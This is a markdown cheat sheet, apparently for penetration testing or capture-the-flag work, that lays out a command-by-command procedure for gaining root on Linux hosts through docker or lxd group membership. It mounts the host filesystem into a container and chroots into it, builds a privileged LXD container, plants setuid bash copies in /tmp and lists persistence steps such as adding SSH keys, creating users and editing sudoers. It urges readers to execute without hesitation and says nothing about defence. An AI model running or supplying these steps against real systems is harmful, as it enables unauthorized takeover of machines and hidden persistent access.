# Linux Privilege Escalation – Docker & LXC/LXD Groups

## Purpose

This file provides a structured workflow for exploiting Docker and LXC/LXD group membership for privilege escalation.

Core rules:

* Docker group = root equivalent
* LXC/LXD group = root equivalent
* If user is in these groups → immediate escalation path

---

## 0. Check Group Membership (CRITICAL FIRST STEP)

```bash
id
```

Look for:

```text
docker
lxd
lxc
```

---

## 1. Why This Is Dangerous

Members of these groups can:

* mount host filesystem
* run containers as root
* escape container boundaries

→ effectively root access

---

# =========================

# DOCKER EXPLOITATION

# =========================

## 2. Check Docker Access

```bash
docker ps
```

If works:
→ you can control containers

---

## 3. List Images

```bash
docker images
```

---

## 4. Spawn Root Container (HOST ACCESS)

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

→ root shell on host

---

## 5. Alternative (If Alpine Not Present)

```bash
docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash
```

---

## 6. Add SUID Shell (Persistence)

Inside container:

```bash
cp /bin/bash /mnt/tmp/bash
chmod +s /mnt/tmp/bash
```

Then on host:

```bash
/tmp/bash -p
```

---

# =========================

# LXC / LXD EXPLOITATION

# =========================

## 7. Check LXD Access

```bash
lxc list
```

---

## 8. Import Image

```bash
lxc image import alpine.tar.gz --alias myimage
```

(Use prebuilt image if available)

---

## 9. Initialize Container

```bash
lxc init myimage mycontainer -c security.privileged=true
```

---

## 10. Mount Host Filesystem

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

---

## 11. Start Container

```bash
lxc start mycontainer
```

---

## 12. Get Shell

```bash
lxc exec mycontainer /bin/sh
```

---

## 13. Access Host

```bash
cd /mnt/root
```

→ full host filesystem

---

## 14. Escalate to Root

```bash
chroot /mnt/root /bin/bash
```

---

## 15. Alternative: Add SUID Binary

```bash
cp /bin/bash /mnt/root/tmp/bash
chmod +s /mnt/root/tmp/bash
```

---

# =========================

# POST-ESCALATION

# =========================

## 16. Verify Root

```bash
whoami
```

---

## 17. Persistence

* add SSH keys
* create user
* modify sudoers

---

## 18. If Tools Missing

Try:

* different images
* manual upload
* existing containers

---

## 19. If Stuck

RESET:

* confirm group membership
* retry commands
* check permissions
* test both Docker and LXD

---

## 20. Mental Model

* Group membership = privilege
* Containers = root control
* Mount = host access

---

## 21. Golden Rules

* Always check groups early
* Docker = immediate root path
* LXD = immediate root path
* Do not overthink—execute
